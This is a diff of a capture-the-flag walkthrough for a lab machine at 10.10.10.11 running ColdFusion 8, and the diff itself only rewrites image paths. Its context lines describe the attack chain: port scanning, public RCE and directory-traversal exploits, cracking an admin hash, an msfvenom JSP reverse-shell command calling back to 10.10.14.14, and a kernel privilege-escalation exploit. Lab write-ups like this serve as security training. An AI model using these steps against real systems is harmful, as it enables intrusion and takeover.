@@ -10,7 +10,7 @@ description: 10.10.10.11
 sudo nmap -Pn -p- 10.10.10.11 --min-rate=5000
 ```
 
-![](<../../../.gitbook/assets/image (8) (1).png>)
+![](<../../../../.gitbook/assets/image (8) (1).png>)
 
 Ran a script script based on open ports
 
@@ -49,25 +49,25 @@ OS and Service detection performed. Please report any incorrect results at https
 
 I look to see if there's anything interesting that can be looked at on the browser on this particular port
 
-![](<../../../.gitbook/assets/image (5) (1).png>)
+![](<../../../../.gitbook/assets/image (5) (1).png>)
 
 Clicking on `CFIDE` leads to some pretty interesting findings
 
-![](<../../../.gitbook/assets/image (11) (1).png>)
+![](<../../../../.gitbook/assets/image (11) (1).png>)
 
 I'm most interested in the `administrator` link, so going there takes me to an Admin page!
 
-![](<../../../.gitbook/assets/image (7) (1).png>)
+![](<../../../../.gitbook/assets/image (7) (1).png>)
 
 ## Searchsploit
 
 I search for any public exploits in searchsploit
 
-![](<../../../.gitbook/assets/image (9) (1).png>)
+![](<../../../../.gitbook/assets/image (9) (1).png>)
 
 The Remote Code Execution python script catches my eye so I'll view that one
 
-![](<../../../.gitbook/assets/image (6) (1).png>)
+![](<../../../../.gitbook/assets/image (6) (1).png>)
 
 {% embed url="https://www.exploit-db.com/exploits/50057" %}
 
@@ -81,7 +81,7 @@ This python script does it all! We'll change the listening host IP and port numb
 
 Then we run it and get a shell!
 
-![](<../../../.gitbook/assets/image (2) (1).png>)
+![](<../../../../.gitbook/assets/image (2) (1).png>)
 
 ## Foothold #2 - Directory Traversal
 
@@ -89,7 +89,7 @@ There was also a metasploit module for directory traversal. I was curious about 
 
 {% embed url="https://www.exploit-db.com/exploits/14641" %}
 
-![](<../../../.gitbook/assets/image (4) (1).png>)
+![](<../../../../.gitbook/assets/image (4) (1).png>)
 
 I decided to do this without the python script since you technically don't need to
 
@@ -103,7 +103,7 @@ As you can see, there's a password that's encrypted, so we should crack it.
 
 ### Cracking the hash
 
-![](<../../../.gitbook/assets/image (18) (2).png>)
+![](<../../../../.gitbook/assets/image (18) (2).png>)
 
 ```
 happyday
@@ -111,7 +111,7 @@ happyday
 
 &#x20;Because we have a password, we can log in!
 
-![](<../../../.gitbook/assets/image (15).png>)
+![](<../../../../.gitbook/assets/image (15).png>)
 
 ### Getting a shell
 
@@ -129,31 +129,31 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -f raw > revs
 
 Schedule a New Task
 
-![](<../../../.gitbook/assets/image (10).png>)
+![](<../../../../.gitbook/assets/image (10).png>)
 
 Make sure to save the output to a file in a valid directory. I had to check for what it was on google
 
 [https://help.adobe.com/archive/en\_US/coldfusion/8/cf8\_install.pdf](https://help.adobe.com/archive/en\_US/coldfusion/8/cf8\_install.pdf)
 
-![](<../../../.gitbook/assets/image (8).png>)
+![](<../../../../.gitbook/assets/image (8).png>)
 
 Before you run the scheduled task, make sure to have a web server (I use python) running so it will download your payload
 
-![](<../../../.gitbook/assets/image (4).png>)
+![](<../../../../.gitbook/assets/image (4).png>)
 
-![](<../../../.gitbook/assets/image (1).png>)
+![](<../../../../.gitbook/assets/image (1).png>)
 
-![](<../../../.gitbook/assets/image (7).png>)
+![](<../../../../.gitbook/assets/image (7).png>)
 
 Now start your listener and go to the file in your web browser to catch a shell!
 
-![](<../../../.gitbook/assets/image (12).png>)
+![](<../../../../.gitbook/assets/image (12).png>)
 
 ## Priv Esc
 
 ### SystemInfo
 
-![](<../../../.gitbook/assets/image (14).png>)
+![](<../../../../.gitbook/assets/image (14).png>)
 
 ```
 OS Name:                   Microsoft Windows Server 2008 R2 Standard
@@ -163,13 +163,13 @@ System Type:               x64-based PC
 
 ### whoami /all
 
-![](<../../../.gitbook/assets/image (16).png>)
+![](<../../../../.gitbook/assets/image (16).png>)
 
 
 
 ## Windows Exploit Suggester
 
-![](<../../../.gitbook/assets/image (3) (3).png>)
+![](<../../../../.gitbook/assets/image (3) (3).png>)
 
 {% embed url="https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri/Compiled" %}
 
